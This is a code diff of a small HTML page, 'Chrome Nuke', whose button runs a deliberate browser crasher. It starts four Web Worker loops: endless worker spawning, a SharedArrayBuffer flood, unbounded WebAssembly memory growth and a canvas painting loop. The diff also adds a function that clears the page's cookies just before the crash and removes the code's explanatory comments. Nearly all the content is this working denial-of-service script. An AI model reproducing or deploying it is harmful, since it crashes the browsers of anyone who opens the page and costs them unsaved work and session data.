@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Ultimate Browser Nuke</title>
+  <title>Kill Chrome</title>
   <style>
     :root {
       --bg-start:   #141414;
@@ -65,16 +65,15 @@
 </head>
 <body>
   <div class="card">
-    <div class="title">Ultimate Browser Nuke</div>
-    <div class="subtitle">One click to fire 4 kill‑switches in parallel</div>
+    <div class="title">Chrome Nuke</div>
+    <div class="subtitle">You have about a second to save your chrome after you press the button.</div>
     <div class="warning">
-      All methods use WebWorkers—no single large allocation. This often kills the browser process itself.
+      WARNING: THIS WILL FUCK UP YOUR CHROME. PROCEED AT YOUR OWN RISK.
     </div>
     <button class="button" id="nukeBtn">Crash Browser</button>
   </div>
 
   <script>
-    // 1) Original worker‑bomb: infinite spawn of heavy workers
     const originalURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         while (true) {
@@ -83,7 +82,6 @@
       };
     `], { type: 'application/javascript' }));
 
-    // 2) SharedArrayBuffer flood worker
     const sharedURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         while (true) {
@@ -92,8 +90,6 @@
         }
       };
     `], { type: 'application/javascript' }));
-
-    // 3) WASM memory grower worker
     const wasmURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         const bytes = new Uint8Array([
@@ -106,13 +102,11 @@
         ]);
         WebAssembly.instantiate(bytes)
           .then(obj => {
-            const mem = obj.instance.exports.memory || obj.instance.exports.MEMORY;
+            const mem = obj.instance.exports.memory;
             while (true) mem.grow(1);
           });
       };
     `], { type: 'application/javascript' }));
-
-    // 4) OffscreenCanvas painting loop worker
     const offscreenURL = URL.createObjectURL(new Blob([`
       onmessage = () => {
         if ('OffscreenCanvas' in self) {
@@ -122,22 +116,23 @@
         }
       };
     `], { type: 'application/javascript' }));
-
-    // Launch all four bombs
+    function clearCookies() {
+      document.cookie.split(';').forEach(cookie => {
+        const name = cookie.split('=')[0].trim();
+        document.cookie = name +
+          '=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/';
+      });
+    }
     function nuke() {
-      // SharedArrayBuffer flood
+      clearCookies();
       new Worker(sharedURL).postMessage('go');
-      // WASM memory grow
       new Worker(wasmURL).postMessage('go');
-      // OffscreenCanvas paint
       new Worker(offscreenURL).postMessage('go');
-      // Original worker‑spawner in a tight loop
       while (true) {
         const w = new Worker(originalURL);
         w.postMessage('go');
       }
     }
-
     document.getElementById('nukeBtn')
             .addEventListener('click', () => setTimeout(nuke, 50));
   </script>
